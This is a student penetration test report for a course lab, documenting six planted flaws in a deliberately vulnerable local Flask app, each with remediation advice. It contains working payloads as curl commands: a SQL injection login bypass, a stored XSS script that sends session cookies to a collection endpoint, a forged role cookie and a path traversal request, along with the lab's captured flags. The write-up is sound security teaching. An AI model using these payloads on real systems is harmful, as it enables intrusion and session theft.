# Penetration Test Report — Vuln Hub (INF601 Mini Project 4, Track A)

**Tester:** cdmauch (FHSU)
**Date:** 2026-10-11
**Target:** Vuln Hub — instructor-provided intentionally-vulnerable Flask app
**Target location:** http://127.0.0.1:5000 (local only)
**Seed:** `FLAG_SEED=cdmauch` (flags verified with `check_flags.py`)

---

## Scope & Authorization Statement

This test was performed **only** against the instructor-provided Vuln Hub
application running on my own machine at `http://127.0.0.1:5000`. Vuln Hub is
distributed as an authorized practice target for Mini Project 4 (Cybersecurity
track) and is deliberately insecure. No other host, network, or system was
touched, scanned, or attacked. All testing was conducted locally in a sandboxed
environment, consistent with the assignment's rules of engagement and FHSU
academic-conduct policy. No real user data was involved; all accounts and data
are synthetic fixtures created by the app.

## Summary

Six planted vulnerabilities were identified and exploited. Each exploit produced
a unique `FLAG{...}` token, all six of which validate against seed `cdmauch`
(`6/6 flags valid`). Proof-of-concept requests and raw responses are saved under
`poc/`.

| # | Finding | Class (CWE / OWASP) | Severity | Flag |
|---|---------|---------------------|----------|------|
| 1 | SQL Injection (login bypass) | CWE-89 / A03 | Critical | `FLAG{sqli_d14aa78ca248}` |
| 2 | IDOR (read others' messages) | CWE-639 / A01 | High | `FLAG{idor_25b3a6bacc94}` |
| 3 | Stored XSS (cookie theft) | CWE-79 / A03 | High | `FLAG{xss_d7ddad05744e}` |
| 4 | Broken Authorization (forged role) | CWE-284 / A01 | Critical | `FLAG{authz_9e92b94b4dde}` |
| 5 | Path Traversal | CWE-22 / A01 | High | `FLAG{traversal_0f400e8109b6}` |
| 6 | Sensitive Data Exposure (backup) | CWE-200/530 / A05 | High | `FLAG{exposure_294b6fe0e0bb}` |

Severity reflects impact on this app in a real deployment: items 1 and 4 grant
full administrative/privileged access and are rated Critical; items 2, 3, 5, 6
disclose confidential data or enable session theft and are rated High.

---

## Finding 1 — SQL Injection (authentication bypass)

- **Endpoint:** `POST /login` — **Severity:** Critical — **Flag:** `FLAG{sqli_d14aa78ca248}`

**How found:** The home page hints the login "trusts what you type." Reviewing
`login()` showed user input formatted directly into a SQL string (app.py:212-216).

**Exploit (request):**
```bash
curl -s -i -c cookies.txt \
  --data-urlencode "username=admin' -- -" --data-urlencode "password=x" \
  http://127.0.0.1:5000/login
curl -s -b cookies.txt http://127.0.0.1:5000/dashboard
```

**Evidence (result):** `302 FOUND` → `/dashboard`, `Set-Cookie: auth=YWRtaW46YWRtaW4=`
(`admin:admin`). Dashboard renders: `Nice work bypassing the login. FLAG{sqli_d14aa78ca248}`.

**Root cause:** The injected username closes the string literal and comments out
the password check: `... WHERE username = 'admin' -- -' AND password = 'x'`.

**Remediation:** Use parameterized queries (`execute(sql, (u, p))`); store salted
password hashes (bcrypt/argon2) and verify in constant time; return generic error
messages (the app also leaks raw `sqlite3.Error` text).

## Finding 2 — IDOR (Insecure Direct Object Reference)

- **Endpoint:** `GET /messages/<id>` — **Severity:** High — **Flag:** `FLAG{idor_25b3a6bacc94}`

**How found:** Logged in as the handout user `alice`; her message list only links
ids 4-5. Tried a lower id directly.

**Exploit (request):**
```bash
curl -s -c cookies.txt \
  --data-urlencode "username=alice" --data-urlencode "password=password123" \
  http://127.0.0.1:5000/login
curl -s -b cookies.txt http://127.0.0.1:5000/messages/1
```

**Evidence (result):** `200 OK` returning admin's message #1 "Onboarding secret":
`Internal only. Do not share. FLAG{idor_25b3a6bacc94}`.

**Root cause:** `message_detail` (app.py:259-270) fetches by id with no check that
the row's `owner` matches the session user.

**Remediation:** Enforce an ownership/authorization check on every object fetch
(`WHERE id = ? AND owner = ?`, or compare and return 403/404); scope queries to the
current user server-side.

## Finding 3 — Stored XSS (cross-site scripting)

- **Endpoint:** `POST /guestbook` (rendered on `GET /guestbook`) — **Severity:** High — **Flag:** `FLAG{xss_d7ddad05744e}`

**How found:** Guestbook echoes comments; posted a comment containing markup and
confirmed it was stored unescaped.

**Exploit (request):**
```bash
curl -s -b cookies.txt \
  --data-urlencode "comment=<script>fetch('/grab?c='+document.cookie)</script>" \
  http://127.0.0.1:5000/guestbook
curl -s http://127.0.0.1:5000/grab
```

**Evidence (result):** Comment stored as raw `<script>…</script>`. The simulated
admin bot runs it with the admin cookie and hits the sink; `/grab` shows:
`c=session=admin; flag=FLAG{xss_d7ddad05744e}`.

**Root cause:** Comment bodies are rendered without HTML escaping (app.py:288), so
stored markup becomes live script that reads `document.cookie` and exfiltrates it.

**Remediation:** Rely on Jinja autoescaping (never `| safe` on user input); add a
Content-Security-Policy; set session cookies `HttpOnly`/`Secure`/`SameSite`;
validate/sanitize input server-side.

## Finding 4 — Broken Authorization (forgeable session / privilege escalation)

- **Endpoint:** `GET /vault` — **Severity:** Critical — **Flag:** `FLAG{authz_9e92b94b4dde}`

**How found:** Inspected the auth cookie — it base64-decodes to `username:role`
with no signature, so the role is attacker-controlled.

**Exploit (request):**
```bash
FORGED=$(printf '%s' "hacker:superadmin" | base64)   # aGFja2VyOnN1cGVyYWRtaW4=
curl -s -i --cookie "auth=$FORGED" http://127.0.0.1:5000/vault
```

**Evidence (result):** Normal role → `403 FORBIDDEN` ("superadmins only"). Forged
`superadmin` cookie → `200 OK` "Access granted, superadmin." `FLAG{authz_9e92b94b4dde}`.

**Root cause:** The session token is unsigned base64 (app.py:182-195) and `/vault`
trusts the client-supplied role (app.py:314). No login grants `superadmin`.

**Remediation:** Use a signed/encrypted session (Flask `session` / JWT with verified
signature); keep role/identity server-side keyed by an opaque session id; default-deny.

## Finding 5 — Path Traversal

- **Endpoint:** `GET /download?file=<name>` — **Severity:** High — **Flag:** `FLAG{traversal_0f400e8109b6}`

**How found:** The download endpoint takes a filename parameter; tried `../` to
escape the `public/` directory.

**Exploit (request):**
```bash
curl -s -G --data-urlencode "file=../private/employee_notes.txt" \
  http://127.0.0.1:5000/download
```

**Evidence (result):** `200 OK` returning the confidential sibling file:
`CONFIDENTIAL - employees only … FLAG{traversal_0f400e8109b6}`.

**Root cause:** User input is joined onto the base dir with no confinement
(app.py:321-323); `os.path.join(base, "../private/…")` escapes `public/`.

**Remediation:** Resolve with `os.path.realpath` and verify the result stays inside
the base dir; use `os.path.basename` or `flask.send_from_directory`; allowlist names.

## Finding 6 — Sensitive Data Exposure (exposed backup)

- **Endpoint:** `GET /backups/<path>` (disclosed via `/robots.txt`) — **Severity:** High — **Flag:** `FLAG{exposure_294b6fe0e0bb}`

**How found:** Recon of `/robots.txt` disclosed `Disallow: /backups/`; requested
that path directly.

**Exploit (request):**
```bash
curl -s http://127.0.0.1:5000/robots.txt
curl -s http://127.0.0.1:5000/backups/vulnhub.sql.bak
```

**Evidence (result):** `200 OK` returning a DB backup:
`INSERT INTO secrets VALUES ('FLAG{exposure_294b6fe0e0bb}');`

**Root cause:** A sensitive backup dir is served without authentication
(app.py:338-347); `robots.txt` advertises the path rather than protecting it.

**Remediation:** Keep backups outside the web root; require auth for sensitive files;
never treat `robots.txt` as access control; apply least-privilege file permissions.

---

## Verification

```
$ python check_flags.py submission.txt --username cdmauch
FLAG{sqli_d14aa78ca248}  VALID (sqli)
FLAG{idor_25b3a6bacc94}  VALID (idor)
FLAG{xss_d7ddad05744e}  VALID (xss)
FLAG{authz_9e92b94b4dde}  VALID (authz)
FLAG{traversal_0f400e8109b6}  VALID (traversal)
FLAG{exposure_294b6fe0e0bb}  VALID (exposure)

6/6 flags valid for username cdmauch
```

## Artifacts

- `submission.txt` — the six captured flags (one per line)
- `poc/01_sqli.md` … `poc/06_exposure.md` — per-finding PoC writeups
- `poc/*_response.txt` — raw HTTP responses captured during testing
